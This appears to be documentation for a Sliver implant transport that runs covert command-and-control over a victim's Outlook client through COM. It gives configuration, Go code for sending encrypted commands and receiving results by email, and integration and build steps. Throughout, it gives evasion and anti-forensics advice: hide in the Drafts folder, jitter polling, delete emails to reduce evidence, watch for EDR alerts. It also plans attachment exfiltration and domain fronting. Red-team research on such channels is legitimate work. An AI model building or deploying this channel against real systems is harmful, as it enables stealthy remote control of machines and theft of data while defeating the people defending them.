# Outlook COM C2 Transport

## Overview

The Outlook COM transport provides a covert communication channel for Sliver implants using Microsoft Outlook via COM (Component Object Model) on Windows systems. This transport allows implants to receive commands and send results through email, leveraging the target's legitimate Outlook client.

## Features

- **Bidirectional Communication**: Receive commands via incoming emails and send results via outgoing emails
- **Stealth**: Uses legitimate Outlook client, making traffic blend with normal email activity
- **Encryption**: All C2 messages are encrypted with AES-256-GCM
- **Obfuscation**: Messages are hidden in normal-looking email bodies with random subjects
- **Configurable Polling**: Adjustable poll intervals with jitter support
- **Folder Selection**: Can monitor different Outlook folders (Drafts, Inbox, etc.)

## Architecture

```
Sliver Server → Email → Outlook Mailbox → COM API → Implant (polling)
Implant → COM API → Outlook Client → Email → Sliver Server
```

## Requirements

### Windows-Only
This transport **only works on Windows** systems due to COM dependencies.

### Prerequisites
- Windows operating system (tested on Windows 10/11)
- Microsoft Outlook installed and configured
- Outlook must be running or accessible
- Valid email account configured in Outlook
- User must have permissions to access Outlook via COM

### Dependencies
Add the following dependency to your project:
```bash
go get github.com/go-ole/go-ole
```

## Configuration

### Example Configuration

See `configs/examples/outlook-implant-config.json` for a complete example.

```json
{
  "outlook_transport": {
    "enabled": true,
    "c2_email": "c2handler@example.com",
    "poll_interval": "60s",
    "folder_type": 16,
    "encryption_key": "GENERATE_WITH_KEYGEN",
    "delete_after": false,
    "jitter": 30,
    "session_id": "unique-session-id",
    "max_retries": 3,
    "debug": false
  }
}
```

### Configuration Parameters

| Parameter | Type | Description | Default |
|-----------|------|-------------|---------|
| `enabled` | bool | Enable/disable the transport | `false` |
| `c2_email` | string | Email address of the C2 server | Required |
| `poll_interval` | duration | Time between email checks | `60s` |
| `folder_type` | int | Outlook folder to monitor (see below) | `16` (Drafts) |
| `encryption_key` | []byte | 32-byte AES-256 key | Required |
| `delete_after` | bool | Delete emails after processing | `false` |
| `jitter` | int | Jitter percentage (0-100) | `30` |
| `session_id` | string | Unique session identifier | Required |
| `max_retries` | int | Max errors before stopping | `3` |
| `debug` | bool | Enable verbose logging | `false` |

### Outlook Folder Types

| Type | Folder | Recommended |
|------|--------|-------------|
| 3 | Deleted Items | ❌ |
| 4 | Outbox | ❌ |
| 5 | Sent Mail | ❌ |
| 6 | Inbox | ⚠️ (High traffic) |
| 16 | Drafts | ✅ (Recommended) |
| 23 | Junk | ⚠️ (May be filtered) |

**Recommendation**: Use Drafts (16) for lower detection risk.

## Usage

### 1. Generate Encryption Key

First, generate a secure AES-256 encryption key:

```bash
# Method 1: Using Go
cd implant/sliver/transports/outlook
go run . -generate-key

# Method 2: Programmatically
package main

import (
    "fmt"
    "github.com/bishopfox/sliver/implant/sliver/transports/outlook"
)

func main() {
    key, _ := outlook.GenerateEncryptionKey()
    fmt.Println("Encryption Key (hex):", outlook.KeyToHex(key))
}
```

### 2. Create Configuration

Create a configuration file with your settings:

```go
config := &outlook.OutlookConfig{
    Enabled:       true,
    C2Email:       "c2@yourserver.com",
    PollInterval:  60 * time.Second,
    FolderType:    outlook.OlFolderDrafts,
    EncryptionKey: encryptionKey, // 32 bytes
    DeleteAfter:   false,
    Jitter:        30,
    SessionID:     "session-" + uuid.New().String(),
    MaxRetries:    3,
    Debug:         false,
}
```

### 3. Initialize Transport

```go
import (
    "context"
    "github.com/bishopfox/sliver/implant/sliver/transports/outlook"
)

// Create transport
transport, err := outlook.NewOutlookTransport(config)
if err != nil {
    log.Fatal(err)
}
defer transport.Close()

// Start transport in goroutine
ctx := context.Background()
go transport.Start(ctx)
```

### 4. Send Commands from C2

From the C2 server, send commands via email:

```go
msg := &outlook.C2Message{
    Type:      "cmd",
    TaskID:    "task-123",
    SessionID: "session-456",
    Payload:   base64.StdEncoding.EncodeToString([]byte("whoami")),
}

subject, body, _ := outlook.EncodeMessage(msg, encryptionKey)

// Send email using SMTP or any email API
sendEmail(config.C2Email, subject, body)
```

### 5. Receive Results

Results are automatically sent back as emails. Parse them on the C2 side:

```go
msg, err := outlook.DecodeMessage(emailBody, encryptionKey)
if err != nil {
    log.Fatal(err)
}

if msg.Type == "result" {
    resultData, _ := base64.StdEncoding.DecodeString(msg.Payload)
    fmt.Printf("Task %s result: %s\n", msg.TaskID, resultData)
}
```

## Security Considerations

### Operational Security

1. **Email Account**: Use a legitimate-looking email account
2. **Folder Selection**: Drafts folder is less suspicious than Inbox
3. **Polling Interval**: Longer intervals = better stealth (recommend 60s+)
4. **Jitter**: Always enable jitter (30%+) to avoid patterns
5. **Delete After**: Consider enabling to reduce forensic evidence

### Encryption

- All messages use **AES-256-GCM** encryption
- Each message includes a timestamp to prevent replay attacks
- Messages older than 1 hour are rejected
- Unique nonces for each encryption operation

### Detection Risks

⚠️ **This transport has inherent risks**:

- COM API calls can be monitored
- Email content can be logged by email security gateways
- High-frequency polling may be suspicious
- Outlook process activity may be audited

### Recommendations

1. Use long poll intervals (5+ minutes)
2. Enable jitter (30-50%)
3. Monitor for EDR/AV alerts on COM usage
4. Test in isolated environment first
5. Combine with other transports for redundancy

## Testing

### Run Unit Tests

```bash
cd implant/sliver/transports/outlook
go test -v
```

### Test on Windows VM

1. Set up a Windows VM with Outlook configured
2. Configure a test email account
3. Generate encryption keys
4. Build the implant with Outlook transport enabled
5. Monitor Outlook activity during testing

### Manual Testing

```bash
# Generate test key
go run . -generate-key

# Run tests with coverage
go test -cover -v

# Test specific functions
go test -run TestEncodeDecodeMessage -v
```

## Building

### Build Tags

The Outlook transport uses build tags to ensure it only compiles on Windows:

```go
//go:build windows
// +build windows
```

### Compile for Windows

```bash
# Standard build
GOOS=windows GOARCH=amd64 go build -o implant.exe

# With Outlook transport tag (if needed)
GOOS=windows GOARCH=amd64 go build -tags outlook -o implant-outlook.exe
```

## Troubleshooting

### Common Issues

**Error: "outlook not installed or not accessible"**
- Ensure Outlook is installed
- Check that Outlook is configured with an email account
- Verify user has COM access permissions

**Error: "failed to get folder"**
- Folder type may be invalid
- Outlook may not be running
- Check folder permissions

**Error: "decryption failed"**
- Verify encryption keys match between implant and C2
- Check that the email contains valid C2DATA markers
- Ensure message timestamp is within acceptable range

**High Error Count**
- Check network connectivity
- Verify Outlook is responding
- Increase `max_retries` in configuration
- Check Outlook is not in "Work Offline" mode

### Debug Mode

Enable debug mode for verbose logging:

```go
config.Debug = true
```

This will log:
- Polling activity
- Email processing
- Encryption/decryption operations
- COM interactions
- Errors and warnings

## Integration with Sliver

### Transport Registration

To integrate with the main Sliver transport system, modify `implant/sliver/transports/transports.go`:

```go
import (
    "github.com/bishopfox/sliver/implant/sliver/transports/outlook"
)

func StartOutlookTransport(config *outlook.OutlookConfig) error {
    if !config.Enabled {
        return nil
    }

    transport, err := outlook.NewOutlookTransport(config)
    if err != nil {
        return err
    }

    go transport.Start(context.Background())
    return nil
}
```

## Performance

### Latency
- **Minimum latency**: Poll interval + email delivery time
- **Typical latency**: 60-120 seconds (with 60s poll interval)
- **Maximum latency**: Poll interval + max email delays

### Throughput
- **Limited by email rate limits**
- **Recommended**: <100 emails per hour
- **Maximum message size**: ~10MB (email attachment limits)

### Resource Usage
- **Memory**: ~10-20MB (COM objects)
- **CPU**: Minimal (<1% during polling)
- **Network**: Only email traffic (blends with legitimate traffic)

## Future Enhancements

Potential improvements for future versions:

- [ ] IMAP/SMTP fallback (non-COM)
- [ ] Attachment-based exfiltration
- [ ] Multiple C2 email addresses
- [ ] Email rule automation
- [ ] Calendar-based C2 (appointments as commands)
- [ ] Encrypted attachment support
- [ ] Domain fronting via email providers

## References

- [Microsoft Outlook Object Model](https://learn.microsoft.com/en-us/office/vba/api/overview/outlook)
- [go-ole Documentation](https://github.com/go-ole/go-ole)
- [Sliver Framework](https://github.com/BishopFox/sliver)

## License

This code is part of the Sliver Implant Framework and is licensed under the GNU General Public License v3.0.

## Author

Developed for authorized penetration testing and red team operations.

⚠️ **WARNING**: This tool is for authorized security testing only. Unauthorized use is illegal.
